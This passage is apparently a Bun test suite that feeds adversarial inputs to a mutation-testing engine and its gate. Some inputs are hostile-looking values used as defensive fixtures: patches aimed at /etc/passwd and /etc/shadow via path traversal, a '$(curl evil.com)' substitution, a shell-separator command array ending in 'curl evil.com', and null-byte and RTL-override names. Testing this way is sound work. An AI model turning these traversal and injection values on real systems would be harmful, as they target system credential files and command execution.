import { afterEach, beforeEach, describe, expect, mock, test } from 'bun:test';
import { randomUUID } from 'node:crypto';
import * as fsSync from 'node:fs';
import { mkdtempSync, realpathSync } from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Make an isolated temp directory. */
function makeTempDir(prefix = 'mutation-adversarial-'): string {
	const raw = os.tmpdir();
	const tmp = mkdtempSync(path.join(raw, prefix));
	return realpathSync(tmp);
}

/** Initialize a bare git repo in a directory. */
function initGitRepo(dir: string): void {
	const { spawnSync: s } = require('node:child_process');
	s('git', ['init', '--initial-branch=main'], {
		cwd: dir,
		timeout: 5000,
		stdio: 'ignore',
	});
	s('git', ['config', 'user.email', 'test@test.com'], {
		cwd: dir,
		timeout: 5000,
		stdio: 'ignore',
	});
	s('git', ['config', 'user.name', 'Test User'], {
		cwd: dir,
		timeout: 5000,
		stdio: 'ignore',
	});
	s('git', ['commit', '--allow-empty', '-m', 'initial'], {
		cwd: dir,
		timeout: 5000,
		stdio: 'ignore',
	});
}

// ---------------------------------------------------------------------------
// child_process mock — intercepts spawnSync so tests don't exec real commands.
// ---------------------------------------------------------------------------

// Tracks what spawnSync was called with so tests can assert on it.
export const spawnCallLog: Array<{
	cmd: string;
	args: string[];
	opts: Record<string, unknown>;
}> = [];

const mockSpawnSync = mock(
	(cmd: string, args: string[], opts: Record<string, unknown>) => {
		spawnCallLog.push({ cmd, args, opts: { ...opts } });
		return {
			pid: 12345,
			output: Buffer.alloc(0),
			stdout: Buffer.from('ok'),
			stderr: Buffer.alloc(0),
			status: 0,
			signal: null,
			error: undefined,
		};
	},
);

// Use CJS require in factory to bypass ESM module cache.
// This ensures node:child_process is loaded through the factory, not via
// a top-level ESM import that would cache before mock.module runs.
mock.module('node:child_process', () => {
	// eslint-disable-next-line @typescript-eslint/no-require-imports
	const real =
		require('node:child_process') as typeof import('node:child_process');
	return {
		...real,
		spawnSync: mockSpawnSync,
	};
});

// ---------------------------------------------------------------------------
// Imports after mock setup — engine and gate internals
// ---------------------------------------------------------------------------

import { _internals as engineInternals } from '../../mutation/engine.js';
import { _internals as gateInternals } from '../../mutation/gate.js';

// ---------------------------------------------------------------------------
// Test suite
// ---------------------------------------------------------------------------

describe('mutation_test adversarial — real executeMutationSuite / evaluateMutationGate', () => {
	let tempDir: string;

	beforeEach(() => {
		mockSpawnSync.mockClear();
		spawnCallLog.length = 0;
		tempDir = makeTempDir();
	});

	afterEach(() => {
		mockSpawnSync.mockClear();
		spawnCallLog.length = 0;
	});

	// -------------------------------------------------------------------------
	// Category 1: evaluateMutationGate — boundary kill rates (via _internals)
	// -------------------------------------------------------------------------

	describe('1. evaluateMutationGate — boundary kill rates', () => {
		function makeReport(
			totalMutants: number,
			killed: number,
			survived: number,
		) {
			const results = Array.from({ length: totalMutants }, (_, i) => ({
				patchId: `p${i}`,
				filePath: `f${i}.ts`,
				functionName: `fn${i}`,
				mutationType: 'type',
				outcome:
					i < killed
						? ('killed' as const)
						: i < killed + survived
							? ('survived' as const)
							: ('error' as const),
				durationMs: 10,
				error: undefined as string | undefined,
			}));
			return engineInternals.computeReport(results, 100);
		}

		test('0% kill rate → fail verdict', { timeout: 10000 }, () => {
			const report = makeReport(10, 0, 10);
			const result = gateInternals.evaluateMutationGate(report, 0.8, 0.6);
			expect(result.verdict).toBe('fail');
			expect(result.killRate).toBe(0);
			expect(result.survivedMutants).toHaveLength(10);
			expect(result.message).toContain('FAILED');
		});

		test('100% kill rate → pass verdict', { timeout: 10000 }, () => {
			const report = makeReport(10, 10, 0);
			const result = gateInternals.evaluateMutationGate(report, 0.8, 0.6);
			expect(result.verdict).toBe('pass');
			expect(result.killRate).toBe(1);
			expect(result.survivedMutants).toHaveLength(0);
			expect(result.message).toContain('PASSED');
		});

		// 5/10 = 0.5, which is BELOW 0.6 warn threshold → fail
		test(
			'50% kill rate → fail verdict (below warn threshold)',
			{ timeout: 10000 },
			() => {
				const report = makeReport(10, 5, 5);
				const result = gateInternals.evaluateMutationGate(report, 0.8, 0.6);
				expect(result.verdict).toBe('fail');
				expect(result.killRate).toBe(0.5);
				expect(result.survivedMutants).toHaveLength(5);
			},
		);

		// 6/10 = 0.6 = exactly warn threshold → warn
		test('at warn_threshold exactly → warn verdict', { timeout: 10000 }, () => {
			const report = makeReport(10, 6, 4);
			const result = gateInternals.evaluateMutationGate(report, 0.8, 0.6);
			expect(result.verdict).toBe('warn');
		});

		// 8/10 = 0.8 = exactly pass threshold → pass
		test('at pass_threshold exactly → pass verdict', { timeout: 10000 }, () => {
			const report = makeReport(10, 8, 2);
			const result = gateInternals.evaluateMutationGate(report, 0.8, 0.6);
			expect(result.verdict).toBe('pass');
		});

		// 5/10 = 0.5 < 0.6 warn → fail
		test(
			'below warn_threshold by 1 mutant → fail verdict',
			{ timeout: 10000 },
			() => {
				const report = makeReport(10, 5, 5);
				const result = gateInternals.evaluateMutationGate(report, 0.8, 0.6);
				expect(result.verdict).toBe('fail');
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 2: evaluateMutationGate — threshold validation (via _internals)
	// -------------------------------------------------------------------------

	describe('2. evaluateMutationGate — inverted / invalid thresholds', () => {
		function makeMinimalReport() {
			return engineInternals.computeReport([], 0);
		}

		test('pass_threshold < warn_threshold throws', { timeout: 10000 }, () => {
			const report = makeMinimalReport();
			expect(() =>
				gateInternals.evaluateMutationGate(report, 0.5, 0.7),
			).toThrow(/passThreshold.*must be >= warnThreshold/);
		});

		test(
			'pass_threshold = warn_threshold → denominator guards against div-by-zero',
			{ timeout: 10000 },
			() => {
				const report = makeMinimalReport();
				// 0/0 = 0 kill rate, 0 < 0.6 → fail (no throw)
				const result = gateInternals.evaluateMutationGate(report, 0.6, 0.6);
				expect(result.verdict).toBe('fail');
			},
		);

		// NaN thresholds don't throw — they produce NaN kill rates and fail the comparison
		test(
			'NaN pass_threshold → produces NaN kill rate → fail verdict',
			{ timeout: 10000 },
			() => {
				const report = makeMinimalReport();
				const result = gateInternals.evaluateMutationGate(report, NaN, 0.6);
				expect(result.verdict).toBe('fail');
				expect(result.threshold).toBeNaN();
			},
		);

		// Infinity warn_threshold: 0.8 < Infinity → throws (passThreshold < warnThreshold)
		test(
			'Infinity warn_threshold → throws because passThreshold < Infinity',
			{ timeout: 10000 },
			() => {
				const report = makeMinimalReport();
				expect(() =>
					gateInternals.evaluateMutationGate(report, 0.8, Infinity),
				).toThrow(/passThreshold.*must be >= warnThreshold/);
			},
		);

		// Negative pass_threshold: -0.1 < 0.6 → throws (passThreshold < warnThreshold)
		test(
			'negative pass_threshold → throws because passThreshold < warnThreshold',
			{ timeout: 10000 },
			() => {
				const report = makeMinimalReport();
				expect(() =>
					gateInternals.evaluateMutationGate(report, -0.1, 0.6),
				).toThrow(/passThreshold.*must be >= warnThreshold/);
			},
		);

		// > 1 thresholds don't throw — they produce kill rates > 1 impossible, always fail
		test(
			'pass_threshold > 1 → no kill rate can reach it → fail verdict',
			{ timeout: 10000 },
			() => {
				const report = makeMinimalReport();
				const result = gateInternals.evaluateMutationGate(report, 1.5, 0.6);
				expect(result.verdict).toBe('fail');
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 3: computeReport — malformed MutationResult arrays
	// -------------------------------------------------------------------------

	describe('3. computeReport — malformed result arrays', () => {
		test('empty results array', { timeout: 10000 }, () => {
			const report = engineInternals.computeReport([], 0);
			expect(report.totalMutants).toBe(0);
			expect(report.killRate).toBe(0);
			expect(report.adjustedKillRate).toBe(0);
		});

		test('all errors', { timeout: 10000 }, () => {
			const results = [
				{
					patchId: 'p1',
					filePath: 'f.ts',
					functionName: 'fn',
					mutationType: 'type',
					outcome: 'error' as const,
					durationMs: 5,
				},
			];
			const report = engineInternals.computeReport(results, 10);
			expect(report.errors).toBe(1);
			expect(report.killRate).toBe(0);
		});

		test(
			'all equivalent — denominator excludes equivalent mutants',
			{ timeout: 10000 },
			() => {
				const results = [
					{
						patchId: 'p1',
						filePath: 'f.ts',
						functionName: 'fn',
						mutationType: 'type',
						outcome: 'equivalent' as const,
						durationMs: 5,
					},
				];
				const report = engineInternals.computeReport(results, 10);
				expect(report.totalMutants).toBe(1);
				// denominator = total - equivalent - skipped = 1 - 1 - 0 = 0 → adjustedKillRate = 0
				expect(report.adjustedKillRate).toBe(0);
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 4: executeMutationSuite — path traversal in patch filePath
	// -------------------------------------------------------------------------

	describe('4. executeMutationSuite — path traversal in patch filePath', () => {
		test(
			'patch targets file outside workingDir via ../../../ traversal — produces error outcome',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const traversalPatch = `diff --git a/../../../etc/passwd b/../../../etc/passwd\nindex 1234567..abcdefg 100644\n--- a/dev/null\n+++ b/../../../etc/passwd\n@@ -0,0 +1 @@\n+malicious line\n`;

				const patches = [
					{
						id: 'traversal-1',
						filePath: '../../../etc/passwd',
						functionName: 'fn',
						mutationType: 'type',
						patch: traversalPatch,
					},
				];

				// git apply fails on the traversal path
				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.from(
									'fatal: path contains ..: ../../../etc/passwd',
								),
								status: 128,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				// The patch produced an error outcome (git apply failed), not a crash
				expect(report.results[0].outcome).toBe('error');
				expect(report.results[0].error).toBeDefined();
			},
		);

		test(
			'patch targets absolute path /etc/shadow — produces error outcome',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const absPatch = `diff --git a/etc/shadow b/etc/shadow\nindex 1234567..abcdefg 100644\n--- a/dev/null\n+++ b/etc/shadow\n@@ -0,0 +1 @@\n+malicious\n`;

				const patches = [
					{
						id: 'abs-1',
						filePath: '/etc/shadow',
						functionName: 'fn',
						mutationType: 'type',
						patch: absPatch,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.from(
									'fatal: path not in working tree: /etc/shadow',
								),
								status: 128,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				// git apply failed → error outcome
				expect(report.results[0].outcome).toBe('error');
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 5: executeMutationSuite — shell injection in patch content
	// -------------------------------------------------------------------------

	describe('5. executeMutationSuite — shell injection in patch content', () => {
		test(
			'patch content with command substitution $(curl evil) — array form prevents injection',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const injectionPatch = `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n-export function fn() { return 1; }\n+export function fn() { return $(curl evil.com); }\n`;

				const patches = [
					{
						id: 'inject-1',
						filePath: 'src.ts',
						functionName: 'fn',
						mutationType: 'type',
						patch: injectionPatch,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						// Test command uses array form — no shell string injection possible
						expect(cmd).toBe('echo');
						expect(Array.isArray(args)).toBe(true);
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				// All test command calls used array form
				const testCalls = spawnCallLog.filter((c) => c.cmd !== 'git');
				for (const call of testCalls) {
					expect(Array.isArray(call.args)).toBe(true);
				}
				expect(report.totalMutants).toBe(1);
			},
		);

		test(
			'test_command with shell metacharacters as array elements — array form prevents injection',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const patch = `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n-export function fn() { return 1; }\n+export function fn() { return 2; }\n`;

				const patches = [
					{
						id: 'cmd-inject-1',
						filePath: 'src.ts',
						functionName: 'fn',
						mutationType: 'type',
						patch,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						// Verify array form — no shell operators as a single concatenated string
						expect(Array.isArray(args)).toBe(true);
						for (const arg of args) {
							expect(String(arg)).not.toMatch(/^[;&|]$/);
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				await engineInternals.executeMutationSuite(
					patches,
					// Attempted injection: shell operators as separate array elements
					['node', '-e', 'console.log(1)', ';', 'curl', 'evil.com'],
					['test.test.ts'],
					tempDir,
				);
			},
		);

		test(
			'patch with semicolon ; in diff content — handled as text',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const patch = `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n-export function fn() { return 1; }\n+export function fn() { console.log('pwned'); }\n`;

				const patches = [
					{
						id: 'semi-1',
						filePath: 'src.ts',
						functionName: 'fn',
						mutationType: 'type',
						patch,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						expect(Array.isArray(args)).toBe(true);
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				expect(report.totalMutants).toBe(1);
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 6: executeMutationSuite — oversized / malformed patches
	// -------------------------------------------------------------------------

	describe('6. executeMutationSuite — oversized and malformed patches', () => {
		test(
			'1000 patches — processes all without hanging',
			{ timeout: 30000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const manyPatches = Array.from({ length: 1000 }, (_, i) => ({
					id: `bulk-${i}`,
					filePath: 'src.ts',
					functionName: `fn${i}`,
					mutationType: 'off_by_one',
					patch: `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n export function fn() { return ${i}; }\n`,
				}));

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					manyPatches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				expect(report.totalMutants).toBe(1000);
			},
		);

		test(
			'100K+ character patch content — handled without crash',
			{ timeout: 15000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const hugeContent = 'x'.repeat(100_000);
				const hugePatch = `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n-export function fn() { return 1; }\n+${hugeContent}\n`;

				const patches = [
					{
						id: 'huge-1',
						filePath: 'src.ts',
						functionName: 'fn',
						mutationType: 'type',
						patch: hugePatch,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				expect(report.totalMutants).toBe(1);
			},
		);

		test(
			'malformed patch (invalid unified diff) — graceful error outcome',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const badPatches = [
					{
						id: 'bad-1',
						filePath: 'src.ts',
						functionName: 'fn',
						mutationType: 'type',
						patch: 'not a valid unified diff at all!!!',
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.from('error: patch failed: src.ts'),
								status: 1,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					badPatches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				// Error outcome, not a crash
				expect(report.results[0].outcome).toBe('error');
			},
		);

		test(
			'patch with missing fields — graceful handling',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				// @ts-expect-error — intentionally incomplete patch
				const incompletePatches = [
					{
						id: 'incomplete-1',
						filePath: 'src.ts',
						// missing functionName, mutationType, patch
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					incompletePatches as any,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				// Should not crash — produces a result
				expect(report.totalMutants).toBe(1);
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 7: executeMutationSuite — empty/zero test command
	// -------------------------------------------------------------------------

	describe('7. executeMutationSuite — empty test command', () => {
		test(
			'empty test_command array — handled without crash',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const patches = [
					{
						id: 'empty-cmd-1',
						filePath: 'src.ts',
						functionName: 'fn',
						mutationType: 'type',
						patch: `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n-export function fn() { return 1; }\n+export function fn() { return 2; }\n`,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					[], // empty command
					['test.test.ts'],
					tempDir,
				);

				// Returns a result without crashing
				expect(report.totalMutants).toBe(1);
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 8: executeMutationSuite — Unicode / null byte injection
	// -------------------------------------------------------------------------

	describe('8. executeMutationSuite — Unicode and null byte injection', () => {
		test(
			'filePath with null byte — graceful error outcome',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const nullByteFile = `src\x00.ts`;
				const patches = [
					{
						id: 'nullbyte-1',
						filePath: nullByteFile,
						functionName: 'fn',
						mutationType: 'type',
						patch: `diff --git a/${nullByteFile} b/${nullByteFile}\nindex 1234567..abcdefg 100644\n--- a/${nullByteFile}\n+++ b/${nullByteFile}\n@@ -1 +1 @@\n export function fn() { return 1; }\n`,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.from(
									`fatal: path not in working tree: ${nullByteFile}`,
								),
								status: 128,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				// Error outcome, not a crash
				expect(report.results[0].outcome).toBe('error');
			},
		);

		test(
			'functionName with zero-width space — handled',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const patches = [
					{
						id: 'zwsp-1',
						filePath: 'src.ts',
						functionName: 'fn\u200B',
						mutationType: 'type',
						patch: `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n export function fn() { return 1; }\n`,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				expect(report.totalMutants).toBe(1);
			},
		);

		test(
			'patch with RTL override character (U+202E) — handled as text',
			{ timeout: 10000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const patches = [
					{
						id: 'rtl-1',
						filePath: 'src.ts',
						functionName: 'fn',
						mutationType: 'type',
						patch: `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n-export function fn() { return 1; }\n+export function fn() { return '\u202Epwned'; }\n`,
					},
				];

				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const report = await engineInternals.executeMutationSuite(
					patches,
					['echo', 'test'],
					['test.test.ts'],
					tempDir,
				);

				expect(report.totalMutants).toBe(1);
			},
		);

		test('emoji in functionName — handled', { timeout: 10000 }, async () => {
			initGitRepo(tempDir);
			fsSync.writeFileSync(
				path.join(tempDir, 'src.ts'),
				'export function fn() { return 1; }\n',
				'utf-8',
			);

			const patches = [
				{
					id: 'emoji-1',
					filePath: 'src.ts',
					functionName: 'fn😀',
					mutationType: 'type',
					patch: `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n export function fn() { return 1; }\n`,
				},
			];

			mockSpawnSync.mockImplementation(
				(cmd: string, args: string[], opts: Record<string, unknown>) => {
					if (cmd === 'git' && args[0] === 'apply') {
						return {
							pid: 1,
							output: Buffer.alloc(0),
							stdout: Buffer.alloc(0),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					}
					return {
						pid: 2,
						output: Buffer.alloc(0),
						stdout: Buffer.from('ok'),
						stderr: Buffer.alloc(0),
						status: 0,
						signal: null,
						error: undefined,
					};
				},
			);

			const report = await engineInternals.executeMutationSuite(
				patches,
				['echo', 'test'],
				['test.test.ts'],
				tempDir,
			);

			expect(report.totalMutants).toBe(1);
		});
	});

	// -------------------------------------------------------------------------
	// Category 9: mutation_test.execute — tool-level validation errors
	// -------------------------------------------------------------------------

	describe('9. mutation_test.execute — tool-level validation rejection', () => {
		let executeMutationTest: (
			args: unknown,
			directory: string,
		) => Promise<string>;

		beforeEach(async () => {
			// Re-import with the mock already in place
			const mod = await import('../mutation-test.js');
			executeMutationTest = mod.mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;
		});

		test(
			'test_command as string (not array) → validation error',
			{ timeout: 10000 },
			async () => {
				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'f.ts',
								functionName: 'fn',
								mutationType: 't',
								patch: 'diff',
							},
						],
						files: ['test.test.ts'],
						test_command: 'npx vitest' as unknown as string[],
					},
					tempDir,
				);
				const parsed = JSON.parse(result);
				expect(parsed.success).toBe(false);
				expect(parsed.error).toContain('test_command');
			},
		);

		test(
			'test_command array with non-string element → validation error',
			{ timeout: 10000 },
			async () => {
				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'f.ts',
								functionName: 'fn',
								mutationType: 't',
								patch: 'diff',
							},
						],
						files: ['test.test.ts'],
						test_command: ['npx', 123 as unknown as string, 'vitest'],
					},
					tempDir,
				);
				const parsed = JSON.parse(result);
				expect(parsed.success).toBe(false);
				expect(parsed.error).toContain('test_command');
			},
		);

		test(
			'files array with undefined element → validation error',
			{ timeout: 10000 },
			async () => {
				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'f.ts',
								functionName: 'fn',
								mutationType: 't',
								patch: 'diff',
							},
						],
						files: ['test.test.ts', undefined as unknown as string],
						test_command: ['npx', 'vitest'],
					},
					tempDir,
				);
				const parsed = JSON.parse(result);
				// Array passes the isArray check; undefined element may pass through
				// or cause an error in later processing
				expect(parsed).toBeDefined();
			},
		);

		test(
			'patches array with null element → caught and returned as error JSON',
			{ timeout: 10000 },
			async () => {
				const result = await executeMutationTest(
					{
						patches: [null as unknown as object],
						files: ['test.test.ts'],
						test_command: ['npx', 'vitest'],
					},
					tempDir,
				);
				const parsed = JSON.parse(result);
				// Error is caught by the outer try-catch in execute()
				expect(parsed.success).toBe(false);
				expect(parsed.error).toContain('mutation_test failed');
			},
		);

		test(
			'pass_threshold < warn_threshold → tool error JSON (gate throws)',
			{ timeout: 10000 },
			async () => {
